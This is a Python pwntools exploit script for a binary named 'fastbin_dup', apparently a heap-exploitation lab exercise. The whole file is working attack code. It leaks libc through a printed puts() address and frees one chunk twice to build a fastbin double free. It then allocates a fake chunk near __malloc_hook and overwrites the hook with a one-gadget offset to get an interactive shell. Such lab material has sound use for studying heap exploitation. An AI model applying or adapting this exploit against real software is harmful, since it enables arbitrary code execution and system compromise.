from pwn import *

elf = context.binary = ELF('fastbin_dup')
libc = ELF(elf.runpath + b'/libc.so.6')
#io = process(elf.path)

script = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=script)
    else:
        return process(elf.path)

io = start()

#Puts addr
io.recvuntil(b'puts() @ ')
puts_addr = int(io.recvline(),16)
libc.address = puts_addr - libc.sym.puts


io.recvuntil(b'username: ')
io.sendline(b'sid')


def malloc(size,data):
	io.recvuntil(b"> ")
	io.sendline(b"1")
	io.recvuntil(b"size: ")
	io.sendline(size)
	io.recvuntil(b"data: ")
	io.sendline(data)

def free(index):
	io.recvuntil(b"> ")
	io.sendline(b"2")
	io.recvuntil(b"index: ")
	io.sendline(index)
	
# 
malloc(b"104",b"A"*0x20)
malloc(b"104",b"C"*0x20)

# 
free(b"0")
free(b"1")
free(b"0")

malloc(b"104", p64(libc.sym.__malloc_hook - 35))
malloc(b"104",b"Y")
malloc(b"104",b"Y")
malloc(b"104",b"Y"*19 + p64(libc.address + 0xe1fa1))
#malloc(b"1",b"") # trigger

gdb.attach(io)
io.interactive()